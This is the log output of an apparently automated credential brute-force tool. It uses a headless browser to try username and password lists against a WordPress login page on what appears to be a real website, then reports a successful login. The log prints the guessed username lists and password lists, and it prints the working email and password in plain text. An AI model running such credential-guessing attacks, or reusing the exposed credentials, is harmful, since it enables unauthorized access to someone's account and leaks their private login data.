INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54600/devtools/browser/8ae5c017-1c01-4e78-b9e2-cbd7da38373b
INFO:root:[webParser] Fetched user and password params from html
INFO:root:{
  "url": "https://alqlambara.com/qemam/wp-login.php",
  "pass_user": "pass_user.csv",
  "params_list": "params.json",
  "req_body": {
    "pwd": "astmamsh123",
    "log": "alqlambara@gmail.com"
  },
  "headers": {
    "Host": "defendtheweb.net",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://alqlambara.com/qemam/wp-login.php",
    "Content-Type": "application/multipart",
    "Origin": "https://defendtheweb.net",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": 1,
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
  },
  "type": "javascript",
  "user_param": "log",
  "password_param": "pwd",
  "action": "https://alqlambara.com/qemam/wp-login.php",
  "req_body_type": "multipart",
  "Usernames": "0        alqlambara@gmail.com\n1                     mohamad\n2                       loool\n3    mohamadassi173@gmail.com\nName: Usernames, dtype: object",
  "Passwords": "0         asdasd\n1    astmamsh123\n2      bara12340\n3         asdasd\nName: Passwords, dtype: object"
}
INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54613/devtools/browser/2a78f776-ad8d-40a3-887a-38bae16e8627
INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:54627/devtools/browser/4ce19232-d448-4356-a885-3db6d7286a62
INFO:root:login successfull

username: alqlambara@gmail.com
password: astmamsh123
INFO:pyppeteer.launcher:terminate chrome process...
INFO:pyppeteer.launcher:terminate chrome process...
INFO:pyppeteer.launcher:terminate chrome process...
